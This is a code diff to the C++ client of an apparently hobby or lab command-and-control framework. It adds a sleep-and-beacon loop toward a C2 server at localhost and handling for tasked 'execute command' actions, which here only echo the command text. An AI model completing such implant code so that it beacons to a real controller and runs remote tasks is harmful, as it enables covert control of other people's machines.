@@ -1,6 +1,8 @@
 #include <iostream>
 #include <random>
 #include <string>
+#include <chrono>
+#include <thread>
 
 #include <sys/socket.h>
 #include <sys/types.h>
@@ -102,6 +104,9 @@ std::unique_ptr<APIT> ProcessServerAction(std::unique_ptr<APIT> serverAction) {
         // Initialize Action Response object now that we have an Action
 		actionResponse = std::make_unique<anomaly::ActionResponseT>();
 
+        // Get the current action
+        currentAction = std::move(serverAction->actions.at(i));
+
         // Process Action Object
 		switch (currentAction->actionType) {
 		case ActionType::ActionType_Config: // Config Change
@@ -114,8 +119,8 @@ std::unique_ptr<APIT> ProcessServerAction(std::unique_ptr<APIT> serverAction) {
 			std::cout << "ActionType 1: Execute Command" << std::endl;
 
             actionResponse->actionId = currentAction->actionId;
-            actionResponse->startTime = "now";
-            actionResponse->endTime = "quickly";
+            actionResponse->startTime = "1111";
+            actionResponse->endTime = "1112";
             actionResponse->stdoutput = "Executed: " + currentAction->command;
             actionResponse->stderror = "";
             actionResponse->error = false;
@@ -166,6 +171,7 @@ int main() {
     struct sockaddr_in servAddr;
     char buff[BUFF_SIZE];
     std::string sessionId;
+    int sleepTime = 5;
 
     // Initialize C2 Server Info
     std::string server = "127.0.0.1";
@@ -237,6 +243,10 @@ int main() {
         // Clear payloads
         payload.clear();
         rawAPIT.clear();
+
+        std::this_thread::sleep_for(std::chrono::seconds(sleepTime));
+
+        SendUdpBeacon(sock, servAddr, beacon.get());
         
     } while(1);
 
